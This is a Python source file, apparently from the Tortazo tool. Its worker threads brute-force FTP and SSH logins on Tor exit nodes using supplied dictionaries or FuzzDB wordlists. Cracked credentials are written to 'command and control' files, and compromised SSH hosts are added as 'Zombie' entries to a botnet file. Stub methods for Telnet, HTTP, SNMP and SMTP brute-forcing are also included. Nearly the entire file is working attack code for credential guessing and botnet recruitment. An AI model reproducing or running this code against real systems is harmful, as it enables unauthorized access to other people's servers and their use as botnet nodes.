# coding=utf-8
'''
Created on 22/01/2014

#Author: Adastra.
#twitter: @jdaanial

WorkerThread.py

WorkerThread is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

WorkerThread is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Tortazo; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
'''

import threading
from stem.util import term
import shodan
import Queue
import paramiko
import os
import ftplib
import sys

class WorkerThread(threading.Thread):
    '''
    Worker Thread to information gathering and attack the exit nodes found.
    '''
    def __init__(self, queue, tid, cli) :
        threading.Thread.__init__(self)
        self.queue = queue
        self.tid = tid
        self.cli = cli
        #This maps to the function name and port number.
        self.bruteForcePorts ={'ftpBrute':21, 'sshBrute':22, 'telnetBrute':23, 'httpBrute':80, 'snmpBrute':161}

    def run(self) :
        lock = threading.Lock()
        while True :
            lock.acquire()
            host = None
            try:
                self.torNode = self.queue.get()
                #values = self.queue.get()
                #self.ip, self.descriptor = values[0]
                #self.ports = values[1]
                if self.cli.brute is True:
                    #if self.cli.dictFile is not None:
                    for method in self.bruteForcePorts.keys():
                        for openPort in self.torNode.openPorts:
                            if self.bruteForcePorts[method] == openPort:
                                #Open port detected for a service supported in the "Brute-Forcer"
                                #Calling the method using reflection.
                                containedMethod = getattr(self, method)
                                if callable(containedMethod):
                                    containedMethod()
                    #else:
                    #    self.cli.logger.warn(term.format("[-] BruteForce mode specified but there's no files for users and passwords. Use -f option", term.Color.RED))
            except Queue.Empty :
                self.cli.logger.debug(term.format("[+] Worker %d exiting... "%self.tid, term.Color.GREEN))
            finally:
                self.cli.logger.debug(term.format("[+] Releasing the Lock in the Thread %d "%self.tid, term.Color.GREEN))
                lock.release()
                self.queue.task_done()

    def ftpBrute(self):
        self.cli.logger.debug(term.format("[+] Starting FTP BruteForce mode on Thread: %d "%self.tid, term.Color.GREEN))
        ftpFileName = 'commandandcontrolftp.txt'
        self.cli.logger.debug(term.format("[+] Trying Anonymous access in: %s "%(self.torNode.host), term.Color.GREEN))
        try:
            ftpClient = ftplib.FTP(self.torNode.host)
            ftpClient.login()
            self.cli.logger.debug(term.format("[+] Anonymous access allowed in: %s "%(self.torNode.host), term.Color.GREEN))
            ftpFile = open(ftpFileName, 'a')
            entry = '%s:%s:%s' %(self.torNode.host, 'anonymous', 'anonymous')
            ftpFile.write(entry+'\n')
            ftpFile.close()
        except:
            self.cli.logger.debug(term.format("[-] Anonymous access is not allowed in: %s "%(self.torNode.host), term.Color.GREEN))

        if(self.cli.dictFile is not None and os.path.exists(self.cli.dictFile)):
            self.cli.logger.debug(term.format("[+] Reading the Passwords file %s " %(self.cli.dictFile), term.Color.GREEN))
            for line in open(self.cli.dictFile, "r").readlines():
                [user, passwd] = line.strip().split()
                try :
                    ftpClient = ftplib.FTP(self.torNode.host)
                    ftpClient.login(user, passwd)
                except:
                    continue
                if ftpClient:
                    self.cli.logger.info(term.format("[+] FTP Bruteforcer Success ... username: %s and passoword %s is VALID! " % (user, passwd), term.Color.YELLOW))
                    ftpClient.quit()
                    ftpFile = open(ftpFileName, 'a')
                    entry =  '%s:%s:%s' %(self.torNode.host, user, passwd)
                    ftpFile.write(entry+'\n')
                    ftpFile.close()
                    ftpClient.close()
        else:
            self.cli.logger.debug(term.format("[+] passwords file not found on the path %s. Now, we'll use FuzzDB!" %(self.cli.dictFile), term.Color.RED))

    def sshBrute(self):
        '''
        Perform the SSH Bruteforce attack.
        '''
        self.cli.logger.debug(term.format("[+] Starting SSH BruteForce mode on Thread: %d " %self.tid, term.Color.GREEN))

        if(self.cli.dictFile is not None and os.path.exists(self.cli.dictFile)):
            self.cli.logger.debug(term.format("[+] Reading the Passwords file %s " %(self.cli.dictFile), term.Color.GREEN))
            for line in open(self.cli.dictFile, "r").readlines():
                [user, passwd] = line.strip().split(self.cli.SEPARATOR)
                if self.performSSHConnection(user, passwd):
                    break

        else:
            self.cli.logger.warn(term.format("[-] Dictionary file not found on the path %s" %(self.cli.dictFile), term.Color.RED))
            usersList = self.getUserlistFromFuzzDB()
            passList = self.getPasslistFromFuzzDB()

            stop_attack = False
            for user in usersList:
                if stop_attack:
                    break
                for passwd in passList:
                    if self.performSSHConnection(user, passwd):
                        stop_attack = True
                        break


    def telnetBrute(self):
        '''
        Perform a bruteforce attack against the Telnet service discovered.
        '''
        pass

    def httpBrute(self):
        '''
        Perform a bruteforce attack against the HTTPD service discovered.
        Uses FuzzDB to execute bruteforce attacks if there's no dictionary file.
        '''
        pass

    def snmpBrute(self):
        '''
        Perform a bruteforce attack against the SNMP service discovered.
        Uses FuzzDB to execute bruteforce attacks if there's no dictionary file.
        '''
        pass

    def smtpBrute(self):
        '''
        Perform a bruteforce attack against the SMTP service discovered.
        Uses FuzzDB to execute
        '''
        pass


    def performSSHConnection(self, user, passwd):
        '''
        Perform SSH Connections using the tortazo_botnet.bot file.
        '''
        tortazoFile = 'tortazo_botnet.bot'
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        sshFileName = 'commandandcontrolssh.txt'
        try:
            client.connect(self.torNode.host, username=user, password=passwd)
        except paramiko.AuthenticationException:
            return False
        self.cli.logger.info(term.format("[+] SSH Bruteforce Success ... username: %s and password %s is VALID! " % (user, passwd), term.Color.YELLOW))
        client.close()
        sshFile = open(sshFileName, 'a')
        entry =  '%s:%s:%s' %(self.torNode.host, user, passwd)
        sshFile.write(entry+'\n')
        sshFile.close()
        self.cli.logger.debug(term.format("[+] Updating the file 'tortazo_botnet.bot' with the new Zombie", term.Color.GREEN))

        try:
            tortazoFd = open(tortazoFile, 'a')
        except:
            print sys.exc_info()

        #host:user:pass:port:nickname
        nickname = '--'
        if self.torNode.nickName:
            nickname = self.torNode.nickName
        entryBotnet = '%s:%s:%s:%s:%s' %(self.torNode.host, user, passwd, '22', nickname)
        content = open(tortazoFile, 'r').readlines()
        if entryBotnet in content:
            self.cli.logger.debug(term.format("[-] Entry duplicated. Server already added in the 'tortazo_botnet.bot' file", term.Color.GREEN))
        else:
            tortazoFd.write(entryBotnet)
            self.cli.logger.debug(term.format("[+] Entry %s added" %(entry), term.Color.GREEN))
            tortazoFd.close()
            return True

    def getUserlistFromFuzzDB(self):
        '''
        Reads:
        fuzzdb/wordlists-user-passwd/names/namelist.txt
        fuzzdb/wordlists-user-passwd/passwds/john.txt
        fuzzdb/wordlists-user-passwd/unix-os/unix-users.txt
        fuzzdb/wordlists-user-passwd/faithwriters.txt

        and returns a list of words (used as possible usernames)
        '''
        self.cli.logger.debug(term.format("[+] Generating users list using the files in FuzzDB", term.Color.GREEN))
        users = []
        try:
            namelist = open('fuzzdb/wordlists-user-passwd/names/namelist.txt', 'r')
            johnlist = open('fuzzdb/wordlists-user-passwd/passwds/john.txt', 'r')
            unixusers = open('fuzzdb/wordlists-user-passwd/unix-os/unix_users.txt', 'r')
            faithwriters = open('fuzzdb/wordlists-user-passwd/faithwriters.txt', 'r')
        except:
            print sys.exc_info()

        for userNameList in namelist.readlines():
            users.append(userNameList)

        for userJohnList in johnlist.readlines():
            users.append(userJohnList)

        for userunix in unixusers.readlines():
            users.append(userunix)

        for userfaithwriter in faithwriters.readlines():
            users.append(userfaithwriter)
        return users

    def getPasslistFromFuzzDB(self):
        '''
        Reads:
        fuzzdb/wordlists-user-passwd/passwds/john.txt
        fuzzdb/wordlists-user-passwd/unix-os/unix-passwords.txt
        fuzzdb/wordlists-user-passwd/weaksauce.txt

        and returns a list of words (used as possible usernames)
        '''
        self.cli.logger.debug(term.format("[+] Generating passwords list using the files in FuzzDB", term.Color.GREEN))
        passwords = []
        johnlist = open('fuzzdb/wordlists-user-passwd/passwds/john.txt', 'r')
        unixpasswords = open('fuzzdb/wordlists-user-passwd/unix-os/unix_passwords.txt', 'r')
        weaksauce = open('fuzzdb/wordlists-user-passwd/passwds/weaksauce.txt', 'r')

        for johnpass in johnlist.readlines():
            passwords.append(johnpass)

        for unixpass in unixpasswords.readlines():
            passwords.append(unixpass)

        for wealsauce in weaksauce.readlines():
            passwords.append(wealsauce)

        return passwords